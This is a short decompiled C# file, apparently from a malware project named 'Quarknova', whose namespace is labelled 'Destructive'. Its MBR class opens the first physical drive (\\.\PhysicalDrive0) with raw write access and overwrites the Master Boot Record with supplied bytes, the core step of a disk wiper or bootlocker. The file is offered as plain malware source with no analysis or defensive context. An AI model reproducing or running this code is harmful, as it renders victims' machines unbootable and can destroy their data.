using System;
using Quarknova.Utilities;

namespace Quarknova.Destructive
{
	// Token: 0x0200000A RID: 10
	internal class MBR
	{
		// Token: 0x06000093 RID: 147 RVA: 0x000057AC File Offset: 0x000039AC
		public static bool Overwrite(byte[] mbrData, string path = "\\\\.\\PhysicalDrive0")
		{
			IntPtr handle = MBR.GetHandle(path);
			uint num;
			return !(handle == IntPtr.Zero) && !(handle == Imports.INVALID_HANDLE_VALUE) && Imports.WriteFile(handle, mbrData, (uint)mbrData.Length, out num, IntPtr.Zero);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000057ED File Offset: 0x000039ED
		public static IntPtr GetHandle(string path = "\\\\.\\PhysicalDrive0")
		{
			return Imports.CreateFile(path, 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
		}
	}
}
